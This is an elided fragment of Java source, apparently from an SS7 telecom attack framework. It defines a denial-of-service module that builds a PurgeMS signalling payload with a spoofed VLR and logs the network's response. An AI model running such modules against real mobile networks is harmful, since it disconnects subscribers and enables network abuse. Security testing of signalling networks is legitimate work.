...
import com.rodan.intruder.ss7.entities.payload.mobility.PurgeMsPayload;
...
import com.rodan.intruder.ss7.usecases.model.dos.DosPurgeResponse;
...
@Module(name = Ss7ModuleConstants.DOS_PURGE_NAME, category = Ss7ModuleConstants.DOS_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.DOS_PURGE_DISPLAY_NAME, brief = Ss7ModuleConstants.DOS_PURGE_BRIEF,
        description = Ss7ModuleConstants.DOS_PURGE_DESCRIPTION, rank = Ss7ModuleConstants.DOS_PURGE_RANK,
        mainPayload = Constants.PURGE_MS_PAYLOAD_NAME)
public class DosPurgeModule extends Ss7ModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(DosPurgeModule.class);

    @Builder
    public DosPurgeModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
    ...
    protected void generatePayload() {
        ...
        var options = (DosPurgeOptions) moduleOptions;
        var payload = PurgeMsPayload.builder()
                ...
                .spoofVlr(options.getSpoofVlr()).mapVersion(options.getMapVersion())
                .build();
    ...
    public void onPurgeMSResponse(PurgeMsResponse response) {
        logger.debug("##### Received PurgeMS response!");
        logger.debug(response);
        moduleResponse = DosPurgeResponse.builder().result("PurgeMS response received successfully").build();
